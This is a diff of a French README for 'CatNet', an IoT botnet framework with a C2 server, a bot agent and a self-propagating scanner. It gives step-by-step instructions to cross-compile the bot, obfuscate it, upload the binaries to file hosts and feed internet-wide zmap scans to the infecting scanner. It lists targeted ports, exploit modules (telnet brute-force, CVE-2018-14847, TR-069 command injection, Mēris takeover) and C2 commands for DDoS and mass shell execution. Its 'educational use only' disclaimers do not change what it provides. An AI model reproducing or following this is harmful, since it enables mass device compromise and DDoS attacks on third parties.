@@ -1,230 +1,201 @@
-# CatNet Botnet
+# CatNet
 
-![CatNet Logo](https://img.shields.io/badge/CatNet-Botnet-red)
+![CatNet](https://img.shields.io/badge/CatNet-Scanner-red)
 
-## Description
+> ⚠️ **Usage éducatif et recherche en sécurité uniquement.** Utiliser ces outils sur des systèmes sans autorisation explicite est illégal.
 
-CatNet est un botnet modulaire conçu à des fins éducatives et de recherche en sécurité informatique. Il comprend trois composants principaux :
+## Vue d'ensemble
 
-1. **C2 Server (simple_c2.py)** : Serveur de commande et contrôle qui gère les bots infectés
-2. **Bot (bot.c)** : Malware qui s'exécute sur les appareils infectés et se connecte au C2
-3. **Scanner (fiber.go)** : Outil qui recherche des appareils vulnérables et les infecte avec le bot
+CatNet est un framework de scan/infection IoT composé de trois parties :
 
-> ⚠️ **AVERTISSEMENT** : Ce code est fourni UNIQUEMENT à des fins éducatives et de recherche. L'utilisation de ce code pour attaquer des systèmes sans autorisation explicite est illégale et contraire à l'éthique.
+| Composant | Fichier | Rôle |
+|-----------|---------|------|
+| Interface principale | `main.py` | Menu interactif, compilation, upload, orchestration |
+| Scanner | `fiber.go` | Scan réseau, exploitation, propagation |
+| Bot | `bot_discord.go` | Agent installé sur les cibles infectées |
 
-## Installation automatique
+---
 
-Un script d'installation automatique est fourni pour configurer facilement l'ensemble du botnet :
+## Dépendances — installation manuelle requise
 
-```bash
-# Cloner le dépôt
-git clone https://github.com/wattsans-dc/botnet-c2-catnet.git
-cd botnet-c2-catnet
+Le programme **ne les installe pas automatiquement**. Toutes ces étapes sont obligatoires.
 
-# Rendre le script d'installation exécutable
-chmod +x setup.sh
-
-# Exécuter le script d'installation (nécessite les droits root)
-sudo ./setup.sh
-```
-
-Le script vous demandera l'adresse IP de votre serveur C2 et configurera automatiquement tous les composants.
-
-## Installation manuelle
-
-Si vous préférez une installation manuelle, suivez ces étapes :
-
-### 1. Installation des dépendances
+### 1. Python 3.10+
 
 ```bash
-# Mise à jour des paquets
-sudo apt update
-
-# Installation des outils de base
-sudo apt install -y golang zmap screen
-
-# Installation des compilateurs croisés
-sudo apt install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
-sudo apt install -y gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu
-sudo apt install -y gcc-sparc64-linux-gnu
-
-# Pour la compilation 32-bit
-sudo apt install -y gcc-multilib libc6-dev-i386 linux-libc-dev:i386
-
-# Dépendances supplémentaires pour les headers manquants
-sudo apt install -y libc6-dev-mips-cross libc6-dev-arm-cross libc6-dev-arm64-cross
-sudo apt install -y libc6-dev-powerpc-cross libc6-dev-sh4-cross libc6-dev-m68k-cross
-sudo apt install -y libc6-dev-sparc64-cross
+sudo apt update && sudo apt install -y python3 python3-pip
 ```
 
-### 2. Correction pour l'erreur asm/socket.h
+### 2. Go (1.21+)
+
+Le programme cherche Go dans `/usr/local/go/bin/go`. La version `apt` est souvent trop ancienne.
 
 ```bash
-# Pour x86 32-bit
-sudo mkdir -p /usr/i386-linux-gnu/include
-sudo ln -s /usr/include/asm-generic /usr/i386-linux-gnu/include/asm
-
-# Pour les autres architectures
-sudo mkdir -p /usr/mips-linux-gnu/include
-sudo ln -s /usr/include/asm-generic /usr/mips-linux-gnu/include/asm
-
-sudo mkdir -p /usr/arm-linux-gnueabi/include
-sudo ln -s /usr/include/asm-generic /usr/arm-linux-gnueabi/include/asm
-
-sudo mkdir -p /usr/aarch64-linux-gnu/include
-sudo ln -s /usr/include/asm-generic /usr/aarch64-linux-gnu/include/asm
-
-sudo mkdir -p /usr/powerpc-linux-gnu/include
-sudo ln -s /usr/include/asm-generic /usr/powerpc-linux-gnu/include/asm
-
-sudo mkdir -p /usr/sh4-linux-gnu/include
-sudo ln -s /usr/include/asm-generic /usr/sh4-linux-gnu/include/asm
-
-sudo mkdir -p /usr/m68k-linux-gnu/include
-sudo ln -s /usr/include/asm-generic /usr/m68k-linux-gnu/include/asm
-
-sudo mkdir -p /usr/sparc64-linux-gnu/include
-sudo ln -s /usr/include/asm-generic /usr/sparc64-linux-gnu/include/asm
+# Télécharger et installer Go officiel
+wget https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
+sudo rm -rf /usr/local/go
+sudo tar -C /usr/local -xzf go1.22.4.linux-amd64.tar.gz
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+source ~/.bashrc
+go version   # doit afficher go1.22.x
 ```
 
-### 3. Configuration des fichiers source
+### 3. garble (obfuscateur Go, optionnel)
 
-Modifiez les fichiers suivants pour y mettre l'adresse IP de votre serveur C2 :
-
-- Dans **fiber.go** : Modifiez la variable `c2ServerIP`
-- Dans **bot.c** : Modifiez la définition `#define C2_SERVER`
-
-### 4. Compilation
-
-#### Compilation du scanner (fiber.go)
+Requis uniquement si tu actives l'obfuscation dans le menu. garble appelle `go` en interne — Go doit être dans le PATH avant d'installer garble.
 
 ```bash
-go build -o fiber fiber.go
-chmod +x fiber
+go install mvdan.cc/garble@latest
+# Le binaire sera dans ~/go/bin/garble
+# Ajouter au PATH si pas déjà fait :
+echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc
+source ~/.bashrc
 ```
 
-#### Compilation du bot pour différentes architectures
+### 4. zmap
+
+Requis pour le scan réseau (mode "IP unique" et scans sur plages).
 
 ```bash
-# MIPS (routeurs courants)
-mips-linux-gnu-gcc -static -o bot.mips bot.c -D__MIPS__
-
-# ARM (IoT, routeurs)
-arm-linux-gnueabi-gcc -static -o bot.arm bot.c -D__ARM__
-
-# ARM64 (appareils modernes)
-aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c -D__ARM__
-
-# x86 (ordinateurs 32-bit)
-gcc -m32 -static -o bot.x86 bot.c
-
-# x86_64 (ordinateurs 64-bit)
-gcc -static -o bot.x86_64 bot.c
-
-# PowerPC
-powerpc-linux-gnu-gcc -static -o bot.ppc bot.c -D__PPC__
-
-# SH4 (anciens appareils embarqués)
-sh4-linux-gnu-gcc -static -o bot.sh4 bot.c
-
-# M68K (anciens systèmes)
-m68k-linux-gnu-gcc -static -o bot.m68k bot.c
-
-# SPARC (serveurs)
-sparc64-linux-gnu-gcc -static -o bot.sparc bot.c -D__SPARC__
+sudo apt install -y zmap
 ```
 
-## Utilisation
-
-### Démarrage du serveur C2
+Sur Raspberry Pi / ARM, zmap peut nécessiter une compilation depuis les sources si le paquet apt n'est pas disponible :
 
 ```bash
-# Démarrer le serveur C2 en arrière-plan avec screen
-screen -dmS c2_server python3 simple_c2.py
-
-# Pour se connecter à la session screen
-screen -r c2_server
+sudo apt install -y cmake libgmp-dev libpcap-dev libjson-c-dev libbytesize-dev
+git clone https://github.com/zmap/zmap.git && cd zmap
+mkdir build && cd build && cmake .. && make -j$(nproc) && sudo make install
 ```
 
-### Démarrage du scanner
+### 5. screen
+
+Requis pour lancer les scans en arrière-plan.
 
 ```bash
-# Démarrer le scanner sur le port 80 en arrière-plan avec screen
-screen -dmS scanner_80 ./fiber 80
-
-# Pour se connecter à la session screen
-screen -r scanner_80
+sudo apt install -y screen
 ```
 
-### Alimentation du scanner
+### 6. masscan (optionnel)
 
-Le scanner attend des adresses IP sur l'entrée standard. Vous pouvez utiliser zmap pour générer des cibles :
+Alternative à zmap pour les scans rapides.
 
 ```bash
-# Scanner le port 80 sur Internet et envoyer les résultats au scanner
-zmap -p 80 | ./fiber 80
-
-# Ou pour un scan plus ciblé
-zmap -p 80 -n 10000 | ./fiber 80
+sudo apt install -y masscan
 ```
 
-## Commandes du serveur C2
+### 7. curl
 
-Une fois connecté à la session screen du serveur C2, vous pouvez utiliser les commandes suivantes :
+Requis pour l'upload des binaires (catbox.moe / transfer.sh / serveur perso).
 
-- `list` - Liste les bots connectés
-- `info <id>` - Affiche les informations détaillées d'un bot
-- `cmd <id> <commande>` - Exécute une commande shell sur un bot spécifique
-- `broadcast <commande>` - Exécute une commande sur tous les bots
-- `ddos <id> <cible:port> <durée>` - Lance une attaque DDoS depuis un bot
-- `ddos-all <cible:port> <durée>` - Lance une attaque DDoS depuis tous les bots
-- `scan <id> <sous-réseau>` - Scanne un sous-réseau depuis un bot
-- `propagate <id> <cible>` - Propage le bot à une nouvelle cible
-- `ping <id>` - Vérifie si un bot est toujours actif
-- `ping-all` - Vérifie tous les bots
-- `kill <id>` - Déconnecte un bot
-- `exit` - Quitte le serveur
+```bash
+sudo apt install -y curl
+```
 
-## Remerciements
+### 8. Compilateurs croisés (pour compiler le bot multi-archi)
 
-Un grand merci à !Dalas pour le code du scanner de bot qui a servi de base pour le développement de ce projet.
+```bash
+sudo apt install -y \
+  gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu \
+  gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu \
+  gcc-sparc64-linux-gnu gcc-multilib libc6-dev-i386
 
-## Architecture du botnet
+# Headers manquants (erreur asm/socket.h)
+for arch in i386-linux-gnu mips-linux-gnu arm-linux-gnueabi aarch64-linux-gnu \
+            powerpc-linux-gnu sh4-linux-gnu m68k-linux-gnu sparc64-linux-gnu; do
+  sudo mkdir -p /usr/$arch/include
+  sudo ln -sf /usr/include/asm-generic /usr/$arch/include/asm
+done
+```
 
-### Serveur C2 (simple_c2.py)
+---
 
-Le serveur C2 opère sur deux ports :
-- **Port 1337** : Communication avec les bots infectés
-- **Port 80** : Serveur HTTP pour distribuer les binaires du malware
+## Lancement
 
-### Bot (bot.c)
+```bash
+sudo python3 main.py
+```
 
-Le bot inclut les fonctionnalités suivantes :
-- Connexion au serveur C2
-- Exécution de commandes shell
-- Attaques DDoS (plusieurs méthodes)
-- Auto-propagation
-- Persistance sur le système infecté
+> Le programme nécessite les droits root pour zmap/masscan (raw sockets).
 
-### Scanner (fiber.go)
+---
 
-Le scanner recherche des appareils vulnérables et tente de les infecter en :
-- Testant les vulnérabilités connues
-- Essayant des combinaisons d'identifiants courantes
-- Téléchargeant et exécutant le malware approprié pour l'architecture cible
+## Flux de travail typique
+
+1. **Menu principal → [1] Services** pour configurer l'IP C2, le port, le mode de distribution
+2. **[2] Compiler les bots** — compile `bot_discord.go` pour toutes les architectures
+3. **[3] Upload** — uploade les binaires compilés sur catbox.moe (ou ton serveur)
+4. **[4] Compiler fiber** — compile le scanner avec les URLs des bots embarquées
+5. **[5] Lancer un scan** — choisir une plage IP ou charger une liste, choisir les ports
+6. **[t] Logs IP unique** — voir les logs en direct du scan en cours
+
+---
+
+## Distribution des binaires
+
+Deux modes disponibles dans le menu Services :
+
+| Mode | Description |
+|------|-------------|
+| `auto` | Upload sur catbox.moe ou transfer.sh. Pas besoin d'IP publique. |
+| `local` | fiber sert lui-même les fichiers. Nécessite une IP/port accessible depuis Internet. |
+
+**Serveur perso** : tu peux renseigner l'URL de ton propre serveur d'hébergement. Il doit accepter un POST multipart sur `/upload.php` et retourner `{"success":true,"url":"..."}`.
+
+---
+
+## Ports scannés par défaut
+
+| Port | Service |
+|------|---------|
+| 80, 8080, 81 | HTTP |
+| 443, 8443 | HTTPS |
+| 23 | Telnet |
+| 7547 | TR-069 (CWMP) |
+| 37215 | Huawei HG532 |
+| 5000 | UPnP |
+| 34567, 9527 | DVR/caméras |
+| 2000 | MikroTik bandwidth-test |
+| 8291 | MikroTik Winbox |
+| 8728 | RouterOS API |
+| 5678 | Mēris SOCKS5 |
+
+---
+
+## Modules d'exploitation (fiber.go)
+
+- **Telnet brute-force** — liste de credentials par défaut IoT
+- **HTTP exploits** — CVE Realtek, Huawei HG532, D-Link, TP-Link, TOTOLINK, etc.
+- **TR-069 / CWMP** — injection de commandes
+- **MikroTik** — CVE-2018-14847 (Winbox, RouterOS < 6.42.1), brute API port 8728, SSH
+- **Mēris takeover** — détecte SOCKS5 port 5678 → supprime schedulers adverses → injecte persistance
+
+---
 
 ## Dépannage
 
-### Problèmes de compilation
+**`garble: can't find Go toolchain`**
+Go n'est pas dans le PATH du sous-processus. Vérifier :
+```bash
+which go   # doit retourner /usr/local/go/bin/go
+```
 
-- **Erreur asm/socket.h** : Vérifiez que vous avez créé les liens symboliques comme indiqué dans la section d'installation
-- **Erreurs de compilation croisée** : Assurez-vous que tous les compilateurs croisés sont installés
+**`screen: command not found`**
+```bash
+sudo apt install -y screen
+```
 
-### Problèmes de connexion
+**`0 Attempted` après plusieurs minutes (scan IP unique)**
+zmap n'a trouvé aucune IP sur ce port dans la plage donnée. fiber attend sur stdin et ne s'arrête pas. Tuer manuellement le screen et relancer avec une autre plage ou un autre port.
 
-- **Les bots ne se connectent pas** : Vérifiez que le port 1337 est ouvert dans votre pare-feu
-- **Téléchargements mais pas de connexions** : Vérifiez que les binaires ont les permissions d'exécution correctes
+**Compilation croisée : `asm/socket.h: No such file or directory`**
+Voir la section compilateurs croisés ci-dessus (liens symboliques asm-generic).
+
+**Les bots compilés ne s'exécutent pas sur la cible**
+Vérifier l'architecture : `file bot.arm` doit correspondre à la cible. Utiliser `bot.mipsle` pour les routeurs MIPS little-endian (Mikrotik CHR, certains TP-Link).
+
+---
 
 ## Licence
 
-Ce projet est fourni à des fins éducatives uniquement. L'utilisation de ce code pour des activités illégales est strictement interdite.
+Usage éducatif uniquement.
